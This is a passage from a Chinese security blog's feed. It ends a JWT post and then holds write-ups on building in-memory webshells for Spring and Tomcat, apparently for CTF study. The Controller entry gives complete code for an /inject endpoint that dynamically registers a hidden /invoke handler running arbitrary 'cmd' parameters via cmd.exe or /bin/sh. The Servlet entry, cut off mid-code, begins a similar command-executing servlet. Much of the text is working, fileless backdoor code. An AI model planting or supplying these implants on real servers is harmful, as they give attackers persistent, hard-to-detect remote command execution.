&#125;</span><br></pre></td></tr></table></figure><p>解析JWT，需要先定义一个解析器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Jws&lt;Claims&gt; claimsJws = Jwts.parserBuilder()</span><br><span class="line">.setSigningKey(SECRET.getBytes(StandardCharsets.UTF_8))</span><br><span class="line">.build()</span><br><span class="line">.parseClaimsJws(Token);</span><br></pre></td></tr></table></figure><p>获取字段名</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">role</span> <span class="operator">=</span> claimsJws.getBody().getSubject();</span><br><span class="line"><span class="type">String</span> <span class="variable">other</span> <span class="operator">=</span> claimsJws.getBody().get(String claimName, Class&lt;T&gt; requiredType);</span><br></pre></td></tr></table></figure><p>最后是我写的一个JWT验证后台，用于一个题目的JWT验证，虽十分简陋但也够用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SECRET</span> <span class="operator">=</span> <span class="string">&quot;&#123;SECRET_KEY_WHICH_YOU_NEED_TO_FIND_IT_OUT&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">EXPIRATION_TIME</span> <span class="operator">=</span> <span class="number">86_400_000L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">parseToken</span><span class="params">(String Token)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Jws&lt;Claims&gt; claimsJws = Jwts.parserBuilder()</span><br><span class="line">                    .setSigningKey(Keys.hmacShaKeyFor(SECRET.getBytes(StandardCharsets.UTF_8)))</span><br><span class="line">                    .build()</span><br><span class="line">                    .parseClaimsJws(Token);</span><br><span class="line">            <span class="type">String</span> <span class="variable">role</span> <span class="operator">=</span> claimsJws.getBody().getSubject();</span><br><span class="line">            <span class="keyword">return</span> role.equals(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">makeUserToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">now</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">Date</span> <span class="variable">expiry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(now.getTime() + EXPIRATION_TIME);</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims().setSubject(<span class="string">&quot;CommonUser&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;iat&quot;</span>, now);</span><br><span class="line">        claims.put(<span class="string">&quot;exp&quot;</span>, expiry);</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder().setClaims(claims).signWith(Keys.hmacShaKeyFor(SECRET.getBytes(StandardCharsets.UTF_8))).compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></br>]]></content>
      
      
      <categories>
          
          <category> 简易开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Controller内存马</title>
      <link href="/2026/01/09/Controller%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2026/01/09/Controller%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Controller内存马"><a href="#Controller内存马" class="headerlink" title="Controller内存马"></a>Controller内存马</h1><p>Controller作为SpringWeb框架中核心的参与部分，也可以在运行时被动态注册，若注册进去的是恶意类，则达到了注入内存马的效果</p><br/><h2 id="Controller注册流程"><a href="#Controller注册流程" class="headerlink" title="Controller注册流程"></a>Controller注册流程</h2><p>Spring在获取请求分配处理器时，调用了<code>doDispatch()</code>方法，该方法内部又调用了<code>getHandler()</code>方法，返回值被传递给了<code>mappedHandler</code>变量，而此时它已经通过请求路径定向到具体方法了</p><p><img src="/img/post/image-20260109141151070.png" alt="image-20260109141151070"></p><p>说明<code>getHandler()</code>中肯定通过什么获取了请求地址与方法之间的映射关系，现在的目标就是找到这个映射关系，步入<code>getHandler()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(HandlerMapping mapping : <span class="built_in">this</span>.handlerMappings) &#123;</span><br><span class="line">                <span class="type">HandlerExecutionChain</span> <span class="variable">handler</span> <span class="operator">=</span> mapping.getHandler(request);</span><br><span class="line">                <span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> handler;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该方法从<code>handlerMappings</code>这个字段中遍历出<code>mapping</code>，再对其调用g<code>etHandler()</code>方法，<code>handlerMappings</code>字段中存储着一些<code>HandlerMapping</code>对象，其中0号元素<code>RequestingMappingHandlerMapping</code>对象具有<code>mappingRegistry</code>字段，该字段的<code>registry</code>字段存储着我们想要的东西</p><p><img src="/img/post/image-20260109141825732.png" alt="image-20260109141825732"></p><p><code>RequestMappingHandlerMapping</code>对象本身没有<code>getHandler()</code>方法，查找其父类<code>RequestMappingInfoHandlerMapping</code>也不具有该方法，继续查找其父类<code>AbstractHandlerMethodMapping</code>也不具有，继续查找其父类<code>AbstractHandlerMapping</code>，在该类中查找到该方法</p><p>该方法开头就调用了<code>getHandlerInternal()</code>方法，其返回值刚好就是目标方法</p><p><img src="/img/post/image-20260109142622774.png" alt="image-20260109142622774"></p><p>继续跟进<code>getHandlerInternal()</code>，由于<code>AbstractHandlerMapping</code>的该方法为抽象方法，<code>RequestMappingHandlerMapping</code>会调用与其继承关系最近的具有该方法的类，此处为<code>RequestMappingInfoHandlerMapping</code>，但是该方法又去调用了父类的<code>getHandlerInternal()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">protected</span> HandlerMethod <span class="title function_">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        request.removeAttribute(PRODUCIBLE_MEDIA_TYPES_ATTRIBUTE);</span><br><span class="line"></span><br><span class="line">        HandlerMethod var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="built_in">super</span>.getHandlerInternal(request);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ProducesRequestCondition.clearMediaTypesAttribute(request);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>AbstractHandlerMethodMapping</code>中，出现了熟悉的<code>mappingRegistry</code>，该方法实现通过请求路径查找对应的处理方法，通过<code>lookupHandlerMethod</code>取出方法对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">protected</span> HandlerMethod <span class="title function_">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">lookupPath</span> <span class="operator">=</span> <span class="built_in">this</span>.initLookupPath(request);</span><br><span class="line">        <span class="built_in">this</span>.mappingRegistry.acquireReadLock();</span><br><span class="line"></span><br><span class="line">        HandlerMethod var4;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HandlerMethod</span> <span class="variable">handlerMethod</span> <span class="operator">=</span> <span class="built_in">this</span>.lookupHandlerMethod(lookupPath, request);</span><br><span class="line">            var4 = handlerMethod != <span class="literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mappingRegistry.releaseReadLock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么<code>mappingRegistry</code>在哪被赋值呢？我们又该如何正确地给m<code>appingRegistry</code>赋值？<code>MappingRegistry</code>下具有一个<code>register()</code>方法，该方法需要三个参数<code>mapping</code>、<code>handler</code>、<code>method</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(T mapping, Object handler, Method method)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.readWriteLock.writeLock().lock();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">HandlerMethod</span> <span class="variable">handlerMethod</span> <span class="operator">=</span> AbstractHandlerMethodMapping.<span class="built_in">this</span>.createHandlerMethod(handler, method);</span><br><span class="line">                <span class="built_in">this</span>.validateMethodMapping(handlerMethod, mapping);</span><br><span class="line">                Set&lt;String&gt; directPaths = AbstractHandlerMethodMapping.<span class="built_in">this</span>.getDirectPaths(mapping);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(String path : directPaths) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.pathLookup.add(path, mapping);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (AbstractHandlerMethodMapping.<span class="built_in">this</span>.getNamingStrategy() != <span class="literal">null</span>) &#123;</span><br><span class="line">                    name = AbstractHandlerMethodMapping.<span class="built_in">this</span>.getNamingStrategy().getName(handlerMethod, mapping);</span><br><span class="line">                    <span class="built_in">this</span>.addMappingName(name, handlerMethod);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">CorsConfiguration</span> <span class="variable">corsConfig</span> <span class="operator">=</span> AbstractHandlerMethodMapping.<span class="built_in">this</span>.initCorsConfiguration(handler, method, mapping);</span><br><span class="line">                <span class="keyword">if</span> (corsConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">                    corsConfig.validateAllowCredentials();</span><br><span class="line">                    <span class="built_in">this</span>.corsLookup.put(handlerMethod, corsConfig);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.registry.put(mapping, <span class="keyword">new</span> <span class="title class_">MappingRegistration</span>(mapping, handlerMethod, directPaths, name, corsConfig != <span class="literal">null</span>));</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.readWriteLock.writeLock().unlock();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>该方法又被<code>registerMapping()</code>方法调用，后面获取<code>RequestingMappingHandlerMapping</code>可直接调用<code>registerMapping()</code>进行注册</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerMapping</span><span class="params">(T mapping, Object handler, Method method)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.logger.trace(<span class="string">&quot;Register \&quot;&quot;</span> + mapping + <span class="string">&quot;\&quot; to &quot;</span> + method.toGenericString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.mappingRegistry.register(mapping, handler, method);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来，需要获取web环境中的<code>mappingRegistry</code>对象并调用<code>register()</code>方法，前面我们知道，<code>mappingRegistry</code>只是<code>handlerMappings</code>列表中的一个元素的字段，该列表在初始化方法中被赋值，其中一个添加元素的策略如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HandlerMapping</span> <span class="variable">hm</span> <span class="operator">=</span> (HandlerMapping)context.getBean(<span class="string">&quot;handlerMapping&quot;</span>, HandlerMapping.class);</span><br><span class="line"><span class="built_in">this</span>.handlerMappings = Collections.singletonList(hm);</span><br></pre></td></tr></table></figure><p>显然，hm就是列表元素类型，可以依此获取前面的比如<code>RequestingMappingHandlerMapping</code>，现在的问题是如何获取<code>context</code>，<code>context</code>的类型是接口<code>ApplicationContext</code>的实现类，而DispatcherServlet类具有一个<code>webApplicationContext</code>字段（严格上是它的父类<code>FrameworkServlet</code>的字段），该字段为<code>WebApplicationContext</code>接口类型，是<code>ApplicationContext</code>的直接子接口。换言之，<code>webApplicationContex</code>就是当前Web环境下的上下文环境</p><br/><h2 id="构建Controller内存马"><a href="#构建Controller内存马" class="headerlink" title="构建Controller内存马"></a>构建Controller内存马</h2><p>执行恶意命令的Controller</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellController</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">invoke</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        String output;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                result.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            output = result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取从当前请求<code>WebApplicationContext</code>、<code>RequestMappingHandlerMapping</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext webApplicationContext = (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, 0);</span><br><span class="line">RequestMappingHandlerMapping handlerMapping = webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure><p>动态注册Controller</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>.BuilderConfiguration();</span><br><span class="line">config.setPatternParser(handlerMapping.getPatternParser());</span><br><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">mappingInfo</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">.paths(<span class="string">&quot;/invoke&quot;</span>)</span><br><span class="line">.methods(RequestMethod.GET)</span><br><span class="line">.options(config)</span><br><span class="line">.build();</span><br><span class="line"></span><br><span class="line"><span class="type">ShellController</span> <span class="variable">shellController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShellController</span>();</span><br><span class="line">handlerMapping.registerMapping(mappingInfo, shellController, shellController.getClass().getMethod(<span class="string">&quot;invoke&quot;</span>));</span><br></pre></td></tr></table></figure><p>Controller内存马全貌</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">showIndex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">inject</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">webApplicationContext</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>.BuilderConfiguration();</span><br><span class="line">        config.setPatternParser(handlerMapping.getPatternParser());</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">mappingInfo</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">                .paths(<span class="string">&quot;/invoke&quot;</span>)</span><br><span class="line">                .methods(RequestMethod.GET)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="type">ShellController</span> <span class="variable">shellController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShellController</span>();</span><br><span class="line">        handlerMapping.registerMapping(mappingInfo, shellController, shellController.getClass().getMethod(<span class="string">&quot;invoke&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;injected&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RestController</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellController</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">invoke</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            String output;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    result.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                output = result.toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> output;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该内存马是windows的测试环境，Linux环境下需要将终端目录修改至<code>&quot;/bin/sh&quot;</code>，执行参数为<code>&quot;-c&quot;</code></p><br/><h2 id="一些经历"><a href="#一些经历" class="headerlink" title="一些经历"></a>一些经历</h2><p>起初学习Controller内存马是有跟着一些文章视频的，其中一些例子调用<code>registerMapping()</code>注册，为了传入<code>mapping</code>使用了弃用的构造器，这里随便放一例，实际上大多数构造器都被弃用了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RequestMappingInfo</span><span class="params">(<span class="meta">@Nullable</span> PatternsRequestCondition patterns, <span class="meta">@Nullable</span> RequestMethodsRequestCondition methods, <span class="meta">@Nullable</span> ParamsRequestCondition params, <span class="meta">@Nullable</span> HeadersRequestCondition headers, <span class="meta">@Nullable</span> ConsumesRequestCondition consumes, <span class="meta">@Nullable</span> ProducesRequestCondition produces, <span class="meta">@Nullable</span> RequestCondition&lt;?&gt; custom)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>((String)<span class="literal">null</span>, patterns, methods, params, headers, consumes, produces, custom);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这些构造器要求传入<code>PatternsRequestCondition</code>路径匹配条件对象，spring给这个路径对象配置的解析器是<code>AntPathMatcher</code>，而在较新的版本，Spring默认使用<code>PathPatternParser</code>作为解析器，两者在处理请求的逻辑上完全不同</p><p>如果在较新的SpringBoot版本使用旧解析器，会触发旧解析链中<code>UrlPathHelper</code>调用<code>getResolvedLookupPath()</code>尝试获取路径，但<code>PathPatternParser</code>解析路线不需要<code>UrlPathHelper</code>的参与，<code>UrlPathHelper</code>获取不到路径就会抛出异常</p><p>当时就经常抛出异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: Expected lookupPath in request attribute <span class="string">&quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</span>.</span><br></pre></td></tr></table></figure><p>问AI总是说什么线程不同步、手动设置PATH属性什么的，是在是不敢采纳，最后一步步调试在<code>getMatchingMapping()</code>方法中发现分别访问<code>/inject</code>和<code>/invoke</code>时<code>RequestMappingInfo</code>配置不一样</p><p>访问<code>/inject</code>路径，可以正常访问</p><p><img src="/img/post/45188f8d737c2cba81a408b602b30cc9.png" alt="45188f8d737c2cba81a408b602b30cc9"></p><p>访问<code>/invoke</code>路径，抛出异常</p><p><img src="/img/post/7fe01fd21e59a7d06d4d57be531e3262.png" alt="7fe01fd21e59a7d06d4d57be531e3262"></p><p><code>/inject</code>采用了默认的<code>pathPatternCondition</code>，而<code>/invoke</code>采用的是旧的<code>patternsCondition</code>，这就是问题所在</p><p>解决方法是使用方法链的方式去构建<code>mapping</code>，这样可以指定解析器模式，该方法新旧通用，因为是直接获取了Spring的配置信息</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>.BuilderConfiguration();</span><br><span class="line">config.setPatternParser(handlerMapping.getPatternParser());</span><br><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">mappingInfo</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">.paths(<span class="string">&quot;/invoke&quot;</span>)</span><br><span class="line">.methods(RequestMethod.GET)</span><br><span class="line">.options(config)</span><br><span class="line">.build();</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet与Listener内存马</title>
      <link href="/2026/01/06/Servlet%E4%B8%8EListener%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2026/01/06/Servlet%E4%B8%8EListener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h1><p>Servlet内存马通过动态注册恶意Servlet组件，能够使攻击者在访问特定路由时去调用恶意的Servlet进而执行恶意逻辑</p><h2 id="逆向Servlet注册"><a href="#逆向Servlet注册" class="headerlink" title="逆向Servlet注册"></a>逆向Servlet注册</h2><p>Servlet添加逻辑在<code>ContextConfig</code>类中的<code>configureContext()</code>方法中体现，该方法用于读取web.xml配置文件并进行相应配置，其中Servlet相关配置在如下进行</p><p><img src="/img/post/image-20260106162318050.png" alt="image-20260106162318050"></p><p>该段代码没有体现的是<code>Wrapper</code>的<code>setServlet()</code>方法，该方法传递一个Servlet实例，程序如果检测到Servlet为空会利用<code>setClass()</code>中的全限定名参数去实例化，而我们动态注册是不依赖于<code>web.xml</code>配置文件的，所以最后我们要手动调用<code>setServlet()</code>传递一个实例</p><p><code>Wrapper</code>可以视作Servlet的包装，包含了我们的Servlet对象以及其他部分，最后该方法通过</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.context.addChild(wrapper);</span><br></pre></td></tr></table></figure><p>将Servlet放入了容器中。<code>this.context</code>是<code>StandardContext</code>对象，里面包含了各种核心配置。此外，<code>context</code>还需要获取访问该Servlet的路由映射，这部分通过以下代码体现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(Map.Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line"><span class="built_in">this</span>.context.addServletMappingDecoded((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在把我们的恶意Servlet注入容器后，还需要调用<code>addServletMappingDecoded()</code>方法规定路由映射</p><h2 id="构造Servlet内存马"><a href="#构造Servlet内存马" class="headerlink" title="构造Servlet内存马"></a>构造Servlet内存马</h2><p>构造恶意Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CmdServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span 